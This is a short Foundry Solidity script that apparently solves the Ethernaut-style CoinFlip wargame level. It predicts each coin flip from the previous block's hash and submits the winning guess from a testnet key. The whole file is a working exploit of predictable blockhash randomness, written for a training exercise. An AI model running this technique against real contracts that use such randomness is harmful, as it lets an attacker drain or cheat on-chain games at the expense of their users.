// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "forge-std/Script.sol";

interface ICoinFlip {
    function consecutiveWins() external view returns (uint256);

    function flip(bool) external returns (bool);

    function FACTOR() external view returns (uint256);
}

contract HackCoinFlipScript is Script {
    function run() external {
        uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        ICoinFlip coinFlip = ICoinFlip(vm.envAddress("COINFLIP_ADDRESS"));
        uint256 deployerKey = vm.envUint("TESTNET_PRIVATE_KEY_1");
        vm.startBroadcast(deployerKey);

        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 flip = blockValue / factor;
        bool guess = (flip == 1);
        coinFlip.flip(guess);
        console.log(coinFlip.consecutiveWins());

        vm.stopBroadcast();
        console.log("SUCCESS!!! Submit the instance.");
    }
}
